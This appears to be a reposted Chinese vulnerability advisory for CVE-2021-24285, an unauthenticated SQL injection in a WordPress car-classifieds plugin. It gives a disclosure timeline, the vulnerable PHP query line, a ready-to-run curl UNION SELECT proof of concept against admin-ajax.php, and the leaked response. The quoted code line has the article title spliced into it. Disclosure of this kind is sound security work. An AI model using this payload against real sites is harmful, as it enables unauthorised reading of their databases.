> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/1CAS8RCbXwE0jzthSx7gtA)

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV26FPI6h2gQLD7LJy0QHPxn2vTYZuJHPFB1lLe30mAdkQ0ib80V74sYVNiatCXGL3oKaBnZWdzk2oYQ/640?wx_fmt=png)

CVE-2021-24285 

    插件名称：wp-plugin：cars-seller-auto-classifieds-script

    受影响的版本：2.1.0（如果有，则可能是较低版本）

    漏洞：注入

    所需的最低访问级别：未认证

### 披露时间

*   2021 年 4 月 19 日：确定并向 WPScan 公开了问题
    
*   2021 年 4 月 19 日：插件已关闭
    
*   2021 年 4 月 22 日：分配了 CVE
    
*   2021 年 4 月 26 日：公开披露
    

技术细节

        经过 身份验证和未经身份验证的用户都可以使用 request_list_request AJAX 调用，无法 order_id 在 SQL 语句中使用 POST 参数之前对其进行卫生检查，验证或转义，这会导致 SQL 注入问题。

漏洞代码：carseller_request_list.php＃L248

```
248:    $result = $wpdb->get_results("SELECT * FROM $tablename CVE-2021-24285 WordPress Sql注入 WHERE id=" . $_POST['order_id']);
```

Poc：

![](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV26FPI6h2gQLD7LJy0QHPxnxM36oUgZdaXcOOJKVexusOacxKClKd0C7DdiaGk6YLI6fTZ7qqqrTuw/640?wx_fmt=png)

```
curl 'http://<Hostname>/wp-admin/admin-ajax.php' \
  --data-raw 'action=request_list_request&order_id=-1662 UNION ALL SELECT NULL,NULL,current_user(),current_user(),current_user(),NULL,current_user(),current_user(),NULL-- -' \
  --compressed \
  --insecure
```

```
<h1>Request Details</h1>
        <table style=" border: 1px solid #999;width:96%" class="order_detail">
            <tr>
                <td>Request Id</td><td></td>
            </tr>
            <tr>
                <td>Car Title</td><td>Untitled</td>
            </tr>
            <tr>
                <td>Name</td><td>bob@localhost bob@localhost</td>
            </tr>
            <tr>
                <td>Email</td><td>bob@localhost</td>
            </tr>
            <tr>
                <td>Phone</td><td>bob@localhost</td>
            </tr>
            <tr>
                <td>Message</td><td>bob@localhost</td>
            </tr>
            <tr>
                <td colspan="2" align="center"><a href="mailto:bob@localhost" style="background: #2ea2cc;border-color: #0074a2;-webkit-box-shadow: inset 0 1px 0 rgba(120,200,230,.5),0 1px 0 rgba(0,0,0,.15);box-shadow: inset 0 1px 0 rgba(120,200,230,.5),0 1px 0 rgba(0,0,0,.15);color: #fff;text-decoration: none;vertical-align: baseline;display: inline-block;text-decoration: none;font-size: 13px;line-height: 26px;height: 28px;margin: 0;padding: 0 10px 1px;cursor: pointer;border-width: 1px;
border-style: solid;-webkit-appearance: none;-webkit-border-radius: 3px;border-radius: 3px;white-space: nowrap;-webkit-box-sizing: border-box;-moz-box-sizing: border-box;box-sizing: border-box;">Reply</a></td>

            </tr>

        </table>
        <p style="margin-top:20px; text-align:right;"><a href="#" id="close">Close</a></p>
```